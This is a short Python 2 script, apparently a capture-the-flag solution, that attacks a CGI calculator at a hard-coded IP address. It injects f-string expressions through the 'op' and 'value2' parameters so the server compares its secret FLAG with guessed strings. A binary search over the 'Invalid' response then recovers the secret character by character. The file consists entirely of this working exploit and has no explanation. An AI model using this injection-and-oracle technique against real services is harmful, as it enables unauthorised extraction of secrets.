import requests, re


def calc(v1, v2, op, s):
    u = "http://206.189.223.3/cgi-bin/server.py?"
    payload = dict(value1=v1, value2=v2, op=op, source=s)
    # print "", payload,
    r = requests.get(u, params=payload)
    # print r.content
    # print r.url
    res = re.findall("<pre>\n>>>>([\s\S]*)\n>>> <\/pre>",
                     r.content)[0].split('\n')[1]
    # print res
    return res == 'Invalid'


def check(mid):
    s = flag + chr(mid)
    return calc(v1, v2, op, s)


def bin_search(seq=xrange(0x20, 0x80), lo=0, hi=None):
    assert (lo >= 0)
    if hi == None: hi = len(seq)
    while lo < hi:
        mid = (lo + hi) // 2
        # print lo, mid, hi, "\t",
        if check(seq[mid]): hi = mid
        else: lo = mid + 1
    # print lo
    return seq[lo]


flag = ''
# v1, op, v2, s = 'T', "+f", '{"rue" if FLAG<source else "lue~"}', 'a'
v1, op, v2, s = 'T', "+f", "ru{FLAG<source or 14:x}", 'a'
v1, op, v2, s = 'True', "+f", "{FLAG<source}", 'a'
v1, op, v2, s = 'Tru', "+f", "{FLAG<source}", 'a'
# v1, op, v2, s = 'T', "+f", "ru{FLAG<source or 14:x}", 'a'

while (1):
    flag += chr(bin_search() - 1)
    print flag
